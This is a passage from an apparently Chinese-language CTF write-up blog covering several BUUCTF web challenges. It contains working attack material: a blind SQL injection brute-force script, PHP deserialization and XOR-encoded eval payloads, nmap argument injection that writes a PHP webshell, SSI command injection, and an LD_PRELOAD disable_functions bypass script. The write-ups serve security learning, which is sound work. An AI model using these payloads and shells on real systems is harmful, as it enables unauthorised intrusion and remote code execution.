&#39;&#39;;?&gt;</code></pre><p>profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile);</p><p>所以再根据</p><pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;     return preg_replace($safe, &#39;hacker&#39;, $string);  &#125;</code></pre><p>可以进行反序列化字符逃逸</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903162948758.png" alt="image-20210903162948758"></p><pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163055572.png" alt="image-20210903163055572"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163139438.png" alt="image-20210903163139438"></p><p>看一下这个your profile页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163211494.png" alt="image-20210903163211494"></p><p>看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163313640.png" alt="image-20210903163313640"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163322131.png" alt="image-20210903163322131"></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>进去后看源码，有一段js脚本</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906112938529.png" alt="image-20210906112938529"></p><p>试了一下这个md5，能解出来但是是付费记录</p><p>所以直接看flag.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113351506.png" alt="image-20210906113351506"></p><p>“除了购买者和我自己”</p><p>那就试试127.0.0.1本地访问</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113445324.png" alt="image-20210906113445324"></p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>盲注，注入点在id</p><p>可以利用异或来进行盲注</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123555686.png" alt="image-20210906123555686"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123751187.png" alt="image-20210906123751187"></p><p>找个脚本直接爆破，学一下这个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport sysimport timedef get_DBlen(url):    for i in range(1,10):        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i        r &#x3D; requests.get(db_url)        if &quot;Click&quot; in r.text:            print(&quot;数据库名称的长度为:%d&quot;%i)            return idef get_DBname(url,length):    DBname &#x3D; &quot;&quot;    length &#x3D; length + 1    for i in range(1,length):        Max &#x3D; 122        Min &#x3D; 41        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max &#x3D; Mid-1                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2                pass            pass        DBname &#x3D; DBname + chr(Mid)    print(DBname)    return DBnamedef get_TBname(url):    name&#x3D;&quot;&quot;    i &#x3D; 0    while True:        i &#x3D; i+1        Max &#x3D; 128        Min &#x3D; 32        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 爆字段名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 获取flag            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max&#x3D;Mid-1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            pass        name&#x3D;name+chr(Mid)        print(name)        if Mid &#x3D;&#x3D; 31:            break        time.sleep(0.5)  if __name__&#x3D;&#x3D;&quot;__main__&quot;:    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;    db_Len &#x3D; get_DBlen(url)    db_Name &#x3D; get_DBname(url,db_Len)    tb_name &#x3D; get_TBname(url)</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906151816679.png" alt="image-20210906151816679"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150757059.png" alt="image-20210907150757059"></p><p>跳到time.php?source界面看看内容</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150827681.png" alt="image-20210907150827681"></p><p>反序列化构造实现命令执行</p><p>system这里应该是过滤了，可以用assert代替</p><pre class="language-none"><code class="language-none">assert()简介：判断一个表达式是否成立。返回true or false。当参数为字符串时，会被当作php代码执行。例如 assert(&quot;phpinfo()&quot;)  &lt;&#x3D;&#x3D;&gt;  &lt;?phpinfo()?&gt;assert与eval的区别assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</code></pre><p>payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</p><p>或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907151408539.png" alt="image-20210907151408539"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907153837010.png" alt="image-20210907153837010"></p><p>搜索flag就能找到</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>xff头的ssti注入，我好像之前做过一个差不多的</p><p>界面右上角ip可随意改变，因此可以利用readfile函数读flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907155218173.png" alt="image-20210907155218173"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫目录，发现index.php.swp界面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907202133630.png" alt="image-20210907202133630"></p><p>要让password前六位md5值为6d0bc1</p><p>爆破一下</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907203923885.png" alt="image-20210907203923885"></p><p>登录后抓包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204116239.png" alt="image-20210907204116239"></p><p>这里可以看见一个shtml页面</p><p>进入后的页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p><p>这里admin的位置是我们的用户名，这里利用了ssl注入</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入</a></p><p>模板就类似于</p><!--#exec cmd="文件名称"--><p>可以先用ls查看目录找到flag文件，再利用cat查看</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p><p>访问页面找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204713176.png" alt="image-20210907204713176"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12源码里有flag</p><p>好久没做这么简单的了</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>常见的nmap命令</p><p><a href="http://linux.51yip.com/search/nmap">nmap linux 命令 在线中文手册 (51yip.com)</a></p><p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>选项-oG<br>将结果Grep保存。</p><p>nmap -F -oG test.txt 192.168.23.1<br>1<br>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</p><p>nmap -F -oA test 192.168.3.2</p><p>这里就是要用nmap的 -oN命令写shell</p><pre class="language-none"><code class="language-none">&#39; -oN w4ke.txt &#39;</code></pre><p>返回host maybe down之后访问w4ke.txt</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907215022693.png" alt="image-20210907215022693"></p><p>所以可以试试写个一句话木马上去</p><pre class="language-none"><code class="language-none">&#39; -oN b.txt  &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;</code></pre><p>返回了hacker，所以应该是有东西被过滤了</p><p>试了一下发现是php被过滤了</p><p>可以用其他的进行替代</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;eval($_POST[a]);?&gt;</code></pre><p>利用post传参执行命令</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907221126211.png" alt="image-20210907221126211"></p><p>参考链接 </p><p> <a href="https://blog.csdn.net/qq_43801002/article/details/107746582">网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客</a></p><p><a href="https://www.icode9.com/content-4-756152.html">网鼎杯 2020 朱雀组]Nmap (icode9.com)</a></p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>根据题目提示下载压缩包文件，里面存在三千多个php文件</p><p>每一个文件里都有shell，我们要找到一个能用的</p><pre class="language-none"><code class="language-none">import requestsimport osimport reurl &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39;path &#x3D; r&#39;C:\Users\ethe\Desktop\www\src&#39;ptn_get &#x3D; re.compile(br&quot;\$_GET\[&#39;(\w+)&#39;\]&quot;)ptn_res &#x3D; re.compile(br&#39;success_hack&#39;)count &#x3D; 0for f in list(os.scandir(path)):    print(str(f)[11:-2])    count +&#x3D; 1    with open(f.path, &#39;rb&#39;) as fp:        data &#x3D; fp.read()    for get in set(ptn_get.findall(data)):        get &#x3D; get.decode(&#39;utf-8&#39;)        cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39;        r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;)        if ptn_res.search(r.content) is not None:            print(f.name, get)            exit()</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221800930.png" alt="image-20210908221800930"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221812146.png" alt="image-20210908221812146"></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>题目提示xml，抓包后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203429736.png" alt="image-20210909203429736"></p><p>猜应该是有xxe注入，直接上payload，发现没读取成功</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203626014.png" alt="image-20210909203626014"></p><p>看一看dologin.php的源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909204007128.png" alt="image-20210909204007128"></p><pre class="language-none"><code class="language-none">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å·$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç $result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds &#x3D; simplexml_import_dom($dom);$username &#x3D; $creds-&gt;username;$password &#x3D; $creds-&gt;password;if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);&#125;else&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);&#125;&#125;catch(Exception $e)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>但是从这个源码里也找不到flag</p><p>后边就是我看不懂的操作了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p><p>访问proc/net/arp文件查看有无可利用内网主机</p><p>尝试访问一下这个ip，报错</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p><p>之后c段扫描，找到flag</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这题感觉有点问题</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p><p>写脚本找lv6</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153247599.png" alt="image-20210912153247599"></p><p>找到后</p><p>很明显钱不够</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153310649.png" alt="image-20210912153310649"></p><p>这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153400419.png" alt="image-20210912153400419"></p><p>接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153441750.png" alt="image-20210912153441750"></p><p>但是直接在url栏修改会要求用户是admin</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153559514.png" alt="image-20210912153559514"></p><p>这就要求修改jwt的cookie</p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT - 废物大师兄 - 博客园 (cnblogs.com)</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153646824.png" alt="image-20210912153646824"></p><p>这里的c-jwt-crack工具不会用，所以就跳过这部分吧</p><p>看登录后的源码看见<a href="http://www.zip路径/">www.zip路径</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153753980.png" alt="image-20210912153753980"></p><p>下载压缩包后发现全为python文件</p><p>这里是利用了python反编译</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912171400636.png" alt="image-20210912171400636"></p><p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p><p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，<br>pickle序列化后的数据，可读性差，人一般无法识别。</p><p>p = pickle.loads(urllib.unquote(become))</p><p>urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p><p>（1）pickle.dump(obj, file, [,protocol])</p><pre class="language-none"><code class="language-none">    函数的功能：将obj对象序列化存入已经打开的file中。   参数讲解：obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（2）pickle.load(file)</p><pre class="language-none"><code class="language-none">    函数的功能：将file中的对象序列化读出。    参数讲解：file：文件名称。</code></pre><p>（3）pickle.dumps(obj[, protocol])</p><pre class="language-none"><code class="language-none">   函数的功能：将obj对象序列化为string形式，而不是存入文件中。   参数讲解：obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（4）pickle.loads(string)</p><pre class="language-none"><code class="language-none">   函数的功能：从string中读出序列化前的obj对象。   参数讲解：string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</code></pre><p>检测反序列化方法：</p><pre class="language-none"><code class="language-none">全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</code></pre><p>防御方法</p><pre class="language-none"><code class="language-none">1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM0NTA4Mg==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>这里采用reduce</p><p>当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填</p><p>百度个脚本</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914214826558.png" alt="image-20210914214826558"></p><p>把这个值给become里放包就行</p><p>参考链接</p><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055"> Python魔法方法指南_宇宙浪子的专栏-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/2289#toc-4">Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com)</a></p><hr><p>几天之后的补，jwt那个工具环境弄好了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215436728.png" alt="image-20210914215436728"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215503070.png" alt="image-20210914215503070"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>才发现这就是寒假那个招新赛的原题</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133220927.png" alt="image-20210916133220927"></p><p>下划线可以用.来绕过，第二个if可以利用%0a换行绕过</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133253226.png" alt="image-20210916133253226"></p><p>要求本地登录</p><p>抓包改xff</p><p>里面有一段js代码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133335204.png" alt="image-20210916133335204"></p><p>post一个merak值，得到一段代码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133404217.png" alt="image-20210916133404217"></p><p>代码审计</p><p>要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day</p><p>可以用data://text/plain,绕过</p><p>也可以用data:<em>//text/plain;base64,</em></p><p>然后存在一个file_get_contents读取传入的file</p><p>要让这个值经过change函数后为flag.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133828755.png" alt="image-20210916133828755"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133839192.png" alt="image-20210916133839192"></p><p>传进去，拿flag</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code&#x3D;$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;&#x2F;&#x2F; ?&gt;</code></pre><p>有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过</p><p>取反</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182257977.png" alt="image-20210918182257977"></p><p>成功执行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182348259.png" alt="image-20210918182348259"></p><p>这里可以看到禁用的函数</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182433498.png" alt="image-20210918182433498"></p><p>或者利用异或</p><pre class="language-none"><code class="language-none">code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183044112.png" alt="image-20210918183044112"></p><p>一样可以进入phpinfo页面</p><p>查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马</p><p>//抄的payload</p><pre class="language-none"><code class="language-none">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  &#x2F;&#x2F;别忘了后面的分号或者：?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183814123.png" alt="image-20210918183814123"></p><p>然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184148817.png" alt="image-20210918184148817"></p><p>但是</p><p>disable_functions禁用的函数太多导致shell不能执行命令</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p><p>这里可以用蚁剑的插件（蚁剑yyds</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p><p>还有一种方法</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE<br>参考链接：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXP地址</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918194317240.png" alt="image-20210918194317240"></p><p>我看不懂，但我大受震撼</p><p>上传bypass.php</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;    $cmd &#x3D; $_GET[&quot;cmd&quot;];    $out_path &#x3D; $_GET[&quot;outpath&quot;];    $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量    $so_path &#x3D; $_GET[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);  &#x2F;&#x2F;加载恶意动态库    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193756871.png" alt="image-20210918193756871"></p><p>最终payload</p><pre class="language-none"><code 